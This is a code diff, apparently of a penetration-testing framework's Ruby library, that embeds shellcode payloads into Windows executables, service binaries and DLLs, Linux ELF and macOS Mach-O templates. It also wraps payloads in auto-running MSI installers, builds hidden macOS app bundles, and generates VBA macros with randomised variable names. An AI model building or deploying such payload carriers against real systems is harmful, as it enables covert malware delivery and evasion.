+        pe = get_file_contents(opts[:template])
+
+        case opts[:exe_type]
+        when :service_exe
+          opts[:exe_max_sub_length] ||= 8192
+          name = opts[:servicename]
+          if name
+            bo = pe.index('SERVICENAME')
+            unless bo
+              raise 'Invalid PE Service EXE template: missing "SERVICENAME" tag'
+            end
+
+            pe[bo, 11] = [name].pack('a11')
+          end
+          pe[136, 4] = [rand(0x100000000)].pack('V') unless opts[:sub_method]
+        when :dll
+          opts[:exe_max_sub_length] ||= 4096
+        when :exe_sub
+          opts[:exe_max_sub_length] ||= 4096
+        end
+
+        bo = find_payload_tag(pe, 'Invalid PE EXE subst template: missing "PAYLOAD:" tag')
+
+        if code.length <= opts.fetch(:exe_max_sub_length)
+          pe[bo, code.length] = [code].pack('a*')
+        else
+          raise 'The EXE generator now has a max size of ' +
+                "#{opts[:exe_max_sub_length]} bytes, please fix the calling module".to_s
+        end
+
+        if opts[:exe_type] == :dll
+          mt = pe.index('MUTEX!!!')
+          pe[mt, 8] = Rex::Text.rand_text_alpha(8) if mt
+          %w[Local\Semaphore:Default Local\Event:Default].each do |name|
+            offset = pe.index(name)
+            pe[offset, 26] = "Local\\#{Rex::Text.rand_text_alphanumeric(20)}" if offset
+          end
+
+          if opts[:dll_exitprocess]
+            exit_thread = "\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00"
+            exit_process = "\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73"
+            et_index = pe.index(exit_thread)
+            if et_index
+              pe[et_index, exit_process.length] = exit_process
+            else
+              raise 'Unable to find and replace ExitThread in the DLL.'
+            end
+          end
+        end
+
+        pe
+      end
 
   # self.to_win32pe_exe_sub
   #
@@ -637,6 +710,7 @@ require 'digest/sha1'
     opts[:exe_type] = :exe_sub
     exe_sub_method(code,opts)
   end
+
   # self.to_win64pe
   #
   # @param framework  [Msf::Framework]  The framework of you want to use
@@ -647,26 +721,26 @@ require 'digest/sha1'
     # Allow the user to specify their own EXE template
     set_template_default(opts, "template_x64_windows.exe")
 
-    # Try to inject code into executable by adding a section without affecting executable behavior
-    if opts[:inject]
-      injector = Msf::Exe::SegmentInjector.new({
-         :payload  => code,
-         :template => opts[:template],
-         :arch     => :x64,
-         :secname  => opts[:secname]
-      })
-      return injector.generate_pe
-    end
+        # Try to inject code into executable by adding a section without affecting executable behavior
+        if opts[:inject]
+          injector = Msf::Exe::SegmentInjector.new({
+            payload: code,
+            template: opts[:template],
+            arch: :x64,
+            secname: opts[:secname]
+          })
+          return injector.generate_pe
+        end
 
-    # Append a new section instead
-    appender = Msf::Exe::SegmentAppender.new({
-      :payload  => code,
-      :template => opts[:template],
-      :arch     => :x64,
-      :secname	=> opts[:secname]
-    })
-    return appender.generate_pe
-  end
+        # Append a new section instead
+        appender = Msf::Exe::SegmentAppender.new({
+          payload: code,
+          template: opts[:template],
+          arch: :x64,
+          secname: opts[:secname]
+        })
+        return appender.generate_pe
+      end
 
   # Embeds shellcode within a Windows PE file implementing the Windows
   # service control methods.
@@ -680,323 +754,332 @@ require 'digest/sha1'
   #
   # @return [String] Windows Service PE file
   def self.to_win32pe_service(framework, code, opts = {})
-    # Allow the user to specify their own service EXE template
     set_template_default(opts, "template_x86_windows_svc.exe")
-    opts[:exe_type] = :service_exe
-    exe_sub_method(code,opts)
-  end
+    if opts[:sub_method]
+      # Allow the user to specify their own service EXE template
+      opts[:exe_type] = :service_exe
+      return exe_sub_method(code,opts)
+    else
+      ENV['MSF_SERVICENAME'] = opts[:servicename]
 
-  # self.to_win64pe_service
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :exe_type
-  # @option           [String] :service_exe
-  # @option           [String] :dll
-  # @option           [String] :inject
-  # @return           [String]
-  def self.to_win64pe_service(framework, code, opts = {})
-    # Allow the user to specify their own service EXE template
-    set_template_default(opts, "template_x64_windows_svc.exe")
-    opts[:exe_type] = :service_exe
-    exe_sub_method(code,opts)
-  end
+      opts[:framework] = framework
+      opts[:payload] = 'stdin'
+      opts[:encoder] = '@x86/service,'+(opts[:serviceencoder] || '')
 
-  # self.set_template_default_winpe_dll
-  #
-  # Set the default winpe DLL template. It will select the template based on the parameters provided including the size
-  # architecture and an optional flavor. See data/templates/src/pe for template source code and build tools.
-  #
-  # @param opts [Hash]
-  # @param arch The architecture, as one the predefined constants.
-  # @param size [Integer] The size of the payload.
-  # @param flavor [Nil,String] An optional DLL flavor, one of 'mixed_mode' or 'dccw_gdiplus'
-  private_class_method def self.set_template_default_winpe_dll(opts, arch, size, flavor: nil)
-    return if opts[:template].present?
-
-    # dynamic size upgrading is only available when MSF selects the template because there's currently no way to
-    # determine the amount of space that is available in the template provided by the user so it's assumed to be 4KiB
-    match = {4096 => '', 262144 => '.256kib'}.find { |k,v| size <= k }
-    if match
-      opts[:exe_max_sub_length] = match.first
-      size_suffix = match.last
+      # XXX This should not be required, it appears there is a dependency inversion
+      # See https://github.com/rapid7/metasploit-framework/pull/9851
+      venom_generator = Msf::PayloadGenerator.new(opts)
+      code_service = venom_generator.multiple_encode_payload(code)
+      return to_winpe_only(framework, code_service, opts)
     end
+  end
 
-    arch = {ARCH_X86 => 'x86', ARCH_X64 => 'x64'}.fetch(arch, nil)
-    raise ArgumentError, 'The specified arch is not supported, no DLL templates are available for it.' if arch.nil?
-
-    if flavor.present?
-      unless %w[mixed_mode dccw_gdiplus].include?(flavor)
-        raise ArgumentError, 'The specified flavor is not supported, no DLL templates are available for it.'
+      # self.to_win64pe_service
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :exe_type
+      # @option           [String] :service_exe
+      # @option           [String] :dll
+      # @option           [String] :inject
+      # @return           [String]
+      def self.to_win64pe_service(framework, code, opts = {})
+        # Allow the user to specify their own service EXE template
+        set_template_default(opts, 'template_x64_windows_svc.exe')
+        opts[:exe_type] = :service_exe
+        exe_sub_method(code, opts)
       end
 
-      flavor = '_' + flavor
-    end
+      # self.set_template_default_winpe_dll
+      #
+      # Set the default winpe DLL template. It will select the template based on the parameters provided including the size
+      # architecture and an optional flavor. See data/templates/src/pe for template source code and build tools.
+      #
+      # @param opts [Hash]
+      # @param arch The architecture, as one the predefined constants.
+      # @param size [Integer] The size of the payload.
+      # @param flavor [Nil,String] An optional DLL flavor, one of 'mixed_mode' or 'dccw_gdiplus'
+      private_class_method def self.set_template_default_winpe_dll(opts, arch, size, flavor: nil)
+        return if opts[:template].present?
 
-    set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
-  end
+        # dynamic size upgrading is only available when MSF selects the template because there's currently no way to
+        # determine the amount of space that is available in the template provided by the user so it's assumed to be 4KiB
+        match = { 4096 => '', 262144 => '.256kib' }.find { |k, _v| size <= k }
+        if match
+          opts[:exe_max_sub_length] = match.first
+          size_suffix = match.last
+        end
 
-  # self.to_win32pe_dll
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :exe_type
-  # @option           [String] :dll
-  # @option           [String] :inject
-  # @return           [String]
-  def self.to_win32pe_dll(framework, code, opts = {})
-    flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
-    set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: flavor)
-    opts[:exe_type] = :dll
+        arch = { ARCH_X86 => 'x86', ARCH_X64 => 'x64' }.fetch(arch, nil)
+        raise ArgumentError, 'The specified arch is not supported, no DLL templates are available for it.' if arch.nil?
 
-    if opts[:inject]
-      self.to_win32pe(framework, code, opts)
-    else
-      exe_sub_method(code,opts)
-    end
-  end
+        if flavor.present?
+          unless %w[mixed_mode dccw_gdiplus].include?(flavor)
+            raise ArgumentError, 'The specified flavor is not supported, no DLL templates are available for it.'
+          end
 
-  # self.to_win64pe_dll
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :exe_type
-  # @option           [String] :dll
-  # @option           [String] :inject
-  # @return           [String]
-  def self.to_win64pe_dll(framework, code, opts = {})
-    flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
-    set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: flavor)
+          flavor = '_' + flavor
+        end
 
-    opts[:exe_type] = :dll
+        set_template_default(opts, "template_#{arch}_windows#{flavor}#{size_suffix}.dll")
+      end
 
-    if opts[:inject]
-      raise RuntimeError, 'Template injection unsupported for x64 DLLs'
-    else
-      exe_sub_method(code,opts)
-    end
-  end
+      # self.to_win32pe_dll
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :exe_type
+      # @option           [String] :dll
+      # @option           [String] :inject
+      # @return           [String]
+      def self.to_win32pe_dll(framework, code, opts = {})
+        flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
+        set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: flavor)
+        opts[:exe_type] = :dll
 
+        if opts[:inject]
+          to_win32pe(framework, code, opts)
+        else
+          exe_sub_method(code, opts)
+        end
+      end
 
-  # self.to_win32pe_dccw_gdiplus_dll
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :exe_type
-  # @option           [String] :dll
-  # @option           [String] :inject
-  # @return           [String]
-  def self.to_win32pe_dccw_gdiplus_dll(framework, code, opts = {})
-    set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: 'dccw_gdiplus')
-    to_win32pe_dll(framework, code, opts)
-  end
+      # self.to_win64pe_dll
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :exe_type
+      # @option           [String] :dll
+      # @option           [String] :inject
+      # @return           [String]
+      def self.to_win64pe_dll(framework, code, opts = {})
+        flavor = opts.fetch(:mixed_mode, false) ? 'mixed_mode' : nil
+        set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: flavor)
 
-  # self.to_win64pe_dccw_gdiplus_dll
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :exe_type
-  # @option           [String] :dll
-  # @option           [String] :inject
-  # @return           [String]
-  def self.to_win64pe_dccw_gdiplus_dll(framework, code, opts = {})
-    set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: 'dccw_gdiplus')
-    to_win64pe_dll(framework, code, opts)
-  end
+        opts[:exe_type] = :dll
 
-  # Wraps an executable inside a Windows .msi file for auto execution when run
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param exe        [String]
-  # @param opts       [Hash]
-  # @option opts      [String] :msi_template_path
-  # @option opts      [String] :msi_template
-  # @return [String]
-  def self.to_exe_msi(framework, exe, opts = {})
-    if opts[:uac]
-      opts[:msi_template] ||= "template_windows.msi"
-    else
-      opts[:msi_template] ||= "template_nouac_windows.msi"
-    end
-    replace_msi_buffer(exe, opts)
-  end
+        if opts[:inject]
+          raise 'Template injection unsupported for x64 DLLs'
+        else
+          exe_sub_method(code, opts)
+        end
+      end
 
-  #self.replace_msi_buffer
-  #
-  # @param pe     [String]
-  # @param opts   [String]
-  # @option       [String] :msi_template
-  # @option       [String] :msi_template_path
-  # @return       [String]
-  def self.replace_msi_buffer(pe, opts)
-    opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")
+      # self.to_win32pe_dccw_gdiplus_dll
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :exe_type
+      # @option           [String] :dll
+      # @option           [String] :inject
+      # @return           [String]
+      def self.to_win32pe_dccw_gdiplus_dll(framework, code, opts = {})
+        set_template_default_winpe_dll(opts, ARCH_X86, code.size, flavor: 'dccw_gdiplus')
+        to_win32pe_dll(framework, code, opts)
+      end
 
-    if opts[:msi_template].include?(File::SEPARATOR)
-      template = opts[:msi_template]
-    else
-      template = File.join(opts[:msi_template_path], opts[:msi_template])
-    end
+      # self.to_win64pe_dccw_gdiplus_dll
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :exe_type
+      # @option           [String] :dll
+      # @option           [String] :inject
+      # @return           [String]
+      def self.to_win64pe_dccw_gdiplus_dll(framework, code, opts = {})
+        set_template_default_winpe_dll(opts, ARCH_X64, code.size, flavor: 'dccw_gdiplus')
+        to_win64pe_dll(framework, code, opts)
+      end
 
-    msi = self.get_file_contents(template)
+      # Wraps an executable inside a Windows .msi file for auto execution when run
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param exe        [String]
+      # @param opts       [Hash]
+      # @option opts      [String] :msi_template_path
+      # @option opts      [String] :msi_template
+      # @return [String]
+      def self.to_exe_msi(framework, exe, opts = {})
+        if opts[:uac]
+          opts[:msi_template] ||= 'template_windows.msi'
+        else
+          opts[:msi_template] ||= 'template_nouac_windows.msi'
+        end
+        replace_msi_buffer(exe, opts)
+      end
 
-    section_size = 2**(msi[30..31].unpack('v')[0])
+      # self.replace_msi_buffer
+      #
+      # @param pe     [String]
+      # @param opts   [String]
+      # @option       [String] :msi_template
+      # @option       [String] :msi_template_path
+      # @return       [String]
+      def self.replace_msi_buffer(pe, opts)
+        opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, 'templates')
 
-    # This table is one of the few cases where signed values are needed
-    sector_allocation_table = msi[section_size..section_size*2].unpack('l<*')
+        if opts[:msi_template].include?(File::SEPARATOR)
+          template = opts[:msi_template]
+        else
+          template = File.join(opts[:msi_template_path], opts[:msi_template])
+        end
 
-    buffer_chain = []
+        msi = get_file_contents(template)
 
-    # This is closely coupled with the template provided and ideally
-    # would be calculated from the dir stream?
-    current_secid = 5
+        section_size = 2**(msi[30..31].unpack('v')[0])
 
-    until current_secid == -2
-      buffer_chain << current_secid
-      current_secid = sector_allocation_table[current_secid]
-    end
+        # This table is one of the few cases where signed values are needed
+        sector_allocation_table = msi[section_size..section_size * 2].unpack('l<*')
 
-    buffer_size = buffer_chain.length * section_size
+        buffer_chain = []
 
-    if pe.size > buffer_size
-      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
-    end
+        # This is closely coupled with the template provided and ideally
+        # would be calculated from the dir stream?
+        current_secid = 5
 
-    pe_block_start = 0
-    pe_block_end = pe_block_start + section_size - 1
+        until current_secid == -2
+          buffer_chain << current_secid
+          current_secid = sector_allocation_table[current_secid]
+        end
 
-    buffer_chain.each do |section|
-      block_start = section_size * (section + 1)
-      block_end = block_start + section_size - 1
-      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
-      msi[block_start..block_end] = pe_block
-      pe_block_start = pe_block_end + 1
-      pe_block_end += section_size
-    end
+        buffer_size = buffer_chain.length * section_size
 
-    msi
-  end
+        if pe.size > buffer_size
+          raise 'MSI Buffer is not large enough to hold the PE file'
+        end
 
-  # self.to_osx_arm_macho
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @return           [String]
-  def self.to_osx_arm_macho(framework, code, opts = {})
+        pe_block_start = 0
+        pe_block_end = pe_block_start + section_size - 1
 
-    # Allow the user to specify their own template
-    set_template_default(opts, "template_armle_darwin.bin")
+        buffer_chain.each do |section|
+          block_start = section_size * (section + 1)
+          block_end = block_start + section_size - 1
+          pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
+          msi[block_start..block_end] = pe_block
+          pe_block_start = pe_block_end + 1
+          pe_block_end += section_size
+        end
 
-    mo = self.get_file_contents(opts[:template])
-    bo = self.find_payload_tag(mo, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag")
-    mo[bo, code.length] = code
-    mo
-  end
+        msi
+      end
 
-  # self.to_osx_aarch64_macho
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @return           [String]
-  def self.to_osx_aarch64_macho(framework, code, opts = {})
+      # self.to_osx_arm_macho
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String]
+      def self.to_osx_arm_macho(framework, code, opts = {})
+        # Allow the user to specify their own template
+        set_template_default(opts, 'template_armle_darwin.bin')
 
-    # Allow the user to specify their own template
-    set_template_default(opts, "template_aarch64_darwin.bin")
+        mo = get_file_contents(opts[:template])
+        bo = find_payload_tag(mo, 'Invalid OSX ArmLE Mach-O template: missing "PAYLOAD:" tag')
+        mo[bo, code.length] = code
+        mo
+      end
 
-    mo = self.get_file_contents(opts[:template])
-    bo = self.find_payload_tag(mo, "Invalid OSX Aarch64 Mach-O template: missing \"PAYLOAD:\" tag")
-    mo[bo, code.length] = code
-    Payload::MachO.new(mo).sign
-    mo
-  end
+      # self.to_osx_aarch64_macho
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String]
+      def self.to_osx_aarch64_macho(framework, code, opts = {})
+        # Allow the user to specify their own template
+        set_template_default(opts, 'template_aarch64_darwin.bin')
 
-  # self.to_osx_ppc_macho
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @return           [String]
-  def self.to_osx_ppc_macho(framework, code, opts = {})
+        mo = get_file_contents(opts[:template])
+        bo = find_payload_tag(mo, 'Invalid OSX Aarch64 Mach-O template: missing "PAYLOAD:" tag')
+        mo[bo, code.length] = code
+        Payload::MachO.new(mo).sign
+        mo
+      end
 
-    # Allow the user to specify their own template
-    set_template_default(opts, "template_ppc_darwin.bin")
+      # self.to_osx_ppc_macho
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String]
+      def self.to_osx_ppc_macho(framework, code, opts = {})
+        # Allow the user to specify their own template
+        set_template_default(opts, 'template_ppc_darwin.bin')
 
-    mo = self.get_file_contents(opts[:template])
-    bo = self.find_payload_tag(mo, "Invalid OSX PPC Mach-O template: missing \"PAYLOAD:\" tag")
-    mo[bo, code.length] = code
-    mo
-  end
+        mo = get_file_contents(opts[:template])
+        bo = find_payload_tag(mo, 'Invalid OSX PPC Mach-O template: missing "PAYLOAD:" tag')
+        mo[bo, code.length] = code
+        mo
+      end
 
-  # self.to_osx_x86_macho
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @return           [String]
-  def self.to_osx_x86_macho(framework, code, opts = {})
+      # self.to_osx_x86_macho
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String]
+      def self.to_osx_x86_macho(framework, code, opts = {})
+        # Allow the user to specify their own template
+        set_template_default(opts, 'template_x86_darwin.bin')
 
-    # Allow the user to specify their own template
-    set_template_default(opts, "template_x86_darwin.bin")
+        mo = get_file_contents(opts[:template])
+        bo = find_payload_tag(mo, 'Invalid OSX x86 Mach-O template: missing "PAYLOAD:" tag')
+        mo[bo, code.length] = code
+        mo
+      end
 
-    mo = self.get_file_contents(opts[:template])
-    bo = self.find_payload_tag(mo, "Invalid OSX x86 Mach-O template: missing \"PAYLOAD:\" tag")
-    mo[bo, code.length] = code
-    mo
-  end
+      # self.to_osx_x64_macho
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String]
+      def self.to_osx_x64_macho(framework, code, opts = {})
+        set_template_default(opts, 'template_x64_darwin.bin')
 
-  # self.to_osx_x64_macho
-  #
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param code       [String]
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @return           [String]
-  def self.to_osx_x64_macho(framework, code, opts = {})
-    set_template_default(opts, "template_x64_darwin.bin")
+        macho = get_file_contents(opts[:template])
+        bin = find_payload_tag(macho,
+                               'Invalid Mac OS X x86_64 Mach-O template: missing "PAYLOAD:" tag')
+        macho[bin, code.length] = code
+        macho
+      end
 
-    macho = self.get_file_contents(opts[:template])
-    bin = self.find_payload_tag(macho,
-            "Invalid Mac OS X x86_64 Mach-O template: missing \"PAYLOAD:\" tag")
-    macho[bin, code.length] = code
-    macho
-  end
+      # self.to_osx_app
+      # @param  opts [Hash] The options hash
+      # @option opts [Hash] :exe_name (random) the name of the macho exe file (never seen by the user)
+      # @option opts [Hash] :app_name (random) the name of the OSX app
+      # @option opts [Hash] :hidden (true) hide the app when it is running
+      # @option opts [Hash] :plist_extra ('') some extra data to shove inside the Info.plist file
+      # @return      [String] zip archive containing an OSX .app directory
+      def self.to_osx_app(exe, opts = {})
+        exe_name = opts.fetch(:exe_name) { Rex::Text.rand_text_alpha(8) }
+        app_name = opts.fetch(:app_name) { Rex::Text.rand_text_alpha(8) }
+        hidden = opts.fetch(:hidden, true)
+        plist_extra = opts.fetch(:plist_extra, '')
 
-  # self.to_osx_app
-  # @param  opts [Hash] The options hash
-  # @option opts [Hash] :exe_name (random) the name of the macho exe file (never seen by the user)
-  # @option opts [Hash] :app_name (random) the name of the OSX app
-  # @option opts [Hash] :hidden (true) hide the app when it is running
-  # @option opts [Hash] :plist_extra ('') some extra data to shove inside the Info.plist file
-  # @return      [String] zip archive containing an OSX .app directory
-  def self.to_osx_app(exe, opts = {})
-    exe_name    = opts.fetch(:exe_name) { Rex::Text.rand_text_alpha(8) }
-    app_name    = opts.fetch(:app_name) { Rex::Text.rand_text_alpha(8) }
-    hidden      = opts.fetch(:hidden, true)
-    plist_extra = opts.fetch(:plist_extra, '')
+        app_name.chomp!('.app')
+        app_name += '.app'
 
-    app_name.chomp!(".app")
-    app_name += ".app"
-
-    visible_plist = if hidden
-      %Q|
+        visible_plist = if hidden
+                          %(
       <key>LSBackgroundOnly</key>
       <string>1</string>
-      |
-    else
-      ''
-    end
+      )
+                        else
+                          ''
+                        end
 
-    info_plist = %Q|
+        info_plist = %(
       <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -1012,76 +1095,19 @@ require 'digest/sha1'
   #{plist_extra}
 </dict>
 </plist>
-    |
+    )
 
-    zip = Rex::Zip::Archive.new
-    zip.add_file("#{app_name}/", '')
-    zip.add_file("#{app_name}/Contents/", '')
-    zip.add_file("#{app_name}/Contents/Resources/", '')
-    zip.add_file("#{app_name}/Contents/MacOS/", '')
-    # Add the macho and mark it as executable
-    zip.add_file("#{app_name}/Contents/MacOS/#{exe_name}", exe).last.attrs = 0o777
-    zip.add_file("#{app_name}/Contents/Info.plist", info_plist)
-    zip.add_file("#{app_name}/Contents/PkgInfo", 'APPLaplt')
-    zip.pack
-  end
-
-  # Create an ELF executable containing the payload provided in +code+
-  #
-  # For the default template, this method just appends the payload, checks if
-  # the template is 32 or 64 bit and adjusts the offsets accordingly
-  # For user-provided templates, modifies the header to mark all executable
-  # segments as writable and overwrites the entrypoint (usually _start) with
-  # the payload.
-  # @param framework  [Msf::Framework]  The framework of you want to use
-  # @param opts       [Hash]
-  # @option           [String] :template
-  # @param template   [String]
-  # @param code       [String]
-  # @param big_endian [Boolean]  Set to "false" by default
-  # @return           [String]
-  def self.to_exe_elf(framework, opts, template, code, big_endian=false)
-    if elf? code
-      return code
-    end
-
-    # Allow the user to specify their own template
-    set_template_default(opts, template)
-
-    # The old way to do it is like other formats, just overwrite a big
-    # block of rwx mem with our shellcode.
-    #bo = elf.index( "\x90\x90\x90\x90" * 1024 )
-    #co = elf.index( " " * 512 )
-    #elf[bo, 2048] = [code].pack('a2048') if bo
-
-    # The new template is just an ELF header with its entry point set to
-    # the end of the file, so just append shellcode to it and fixup
-    # p_filesz and p_memsz in the header for a working ELF executable.
-    elf = self.get_file_contents(opts[:template])
-    elf << code
-
-    # Check EI_CLASS to determine if the header is 32 or 64 bit
-    # Use the proper offsets and pack size
-    case elf[4,1].unpack("C").first
-    when 1 # ELFCLASS32 - 32 bit (ruby 1.9+)
-      if big_endian
-        elf[0x44,4] = [elf.length].pack('N') #p_filesz
-        elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
-      else # little endian
-        elf[0x44,4] = [elf.length].pack('V') #p_filesz
-        elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
+        zip = Rex::Zip::Archive.new
+        zip.add_file("#{app_name}/", '')
+        zip.add_file("#{app_name}/Contents/", '')
+        zip.add_file("#{app_name}/Contents/Resources/", '')
+        zip.add_file("#{app_name}/Contents/MacOS/", '')
+        # Add the macho and mark it as executable
+        zip.add_file("#{app_name}/Contents/MacOS/#{exe_name}", exe).last.attrs = 0o777
+        zip.add_file("#{app_name}/Contents/Info.plist", info_plist)
+        zip.add_file("#{app_name}/Contents/PkgInfo", 'APPLaplt')
+        zip.pack
       end
-    when 2 # ELFCLASS64 - 64 bit (ruby 1.9+)
-      if big_endian
-        elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
-        elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
-      else # little endian
-        elf[0x60,8] = [elf.length].pack('Q<') #p_filesz
-        elf[0x68,8] = [elf.length + code.length].pack('Q<') #p_memsz
-      end
-    else
-      raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
-    end
 
     elf
   end
@@ -1396,373 +1422,716 @@ require 'digest/sha1'
           # When maxbytes are written make a new paragrpah
           hash_sub[:data] << "\r\n"
         end
-        idx += 1
+
+        # Allow the user to specify their own template
+        set_template_default(opts, template)
+
+        # The old way to do it is like other formats, just overwrite a big
+        # block of rwx mem with our shellcode.
+        # bo = elf.index( "\x90\x90\x90\x90" * 1024 )
+        # co = elf.index( " " * 512 )
+        # elf[bo, 2048] = [code].pack('a2048') if bo
+
+        # The new template is just an ELF header with its entry point set to
+        # the end of the file, so just append shellcode to it and fixup
+        # p_filesz and p_memsz in the header for a working ELF executable.
+        elf = get_file_contents(opts[:template])
+        elf << code
+
+        # Check EI_CLASS to determine if the header is 32 or 64 bit
+        # Use the proper offsets and pack size
+        case elf[4, 1].unpack('C').first
+        when 1 # ELFCLASS32 - 32 bit (ruby 1.9+)
+          if big_endian
+            elf[0x44, 4] = [elf.length].pack('N') # p_filesz
+            elf[0x48, 4] = [elf.length + code.length].pack('N') # p_memsz
+          else # little endian
+            elf[0x44, 4] = [elf.length].pack('V') # p_filesz
+            elf[0x48, 4] = [elf.length + code.length].pack('V') # p_memsz
+          end
+        when 2 # ELFCLASS64 - 64 bit (ruby 1.9+)
+          if big_endian
+            elf[0x60, 8] = [elf.length].pack('Q>') # p_filesz
+            elf[0x68, 8] = [elf.length + code.length].pack('Q>') # p_memsz
+          else # little endian
+            elf[0x60, 8] = [elf.length].pack('Q<') # p_filesz
+            elf[0x68, 8] = [elf.length + code.length].pack('Q<') # p_memsz
+          end
+        else
+          raise 'Invalid ELF template: EI_CLASS value not supported'
+        end
+
+        elf
       end
-    end
 
-    read_replace_script_template("to_exe.vba.template", hash_sub)
-  end
+      # Create a 32-bit Linux ELF containing the payload provided in +code+
+      #
+      # @param framework  [Msf::Framework]  The framework of you want to use
+      # @param code       [String]
+      # @param opts       [Hash]
+      # @option           [String] :template
+      # @return           [String] Returns an elf
+      def self.to_linux_x86_elf(framework, code, opts = {})
+        default = true unless opts[:template]
 
-  # self.to_vba
-  #
-  # @param framework  [Msf::Framework]
-  # @param code       [String]
-  # @param opts       [Hash]    Unused
-  def self.to_vba(framework,code,opts = {})
-    hash_sub = {}
-    hash_sub[:var_myByte]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_myArray]            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_rwxpage]            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_res]                = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_offset]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_dwStackSize]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpStartAddress]     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpParameter]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_dwCreationFlags]    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpThreadID]         = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lpAddr]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lSize]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_flAllocationType]   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_flProtect]          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lDest]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Source]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Length]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
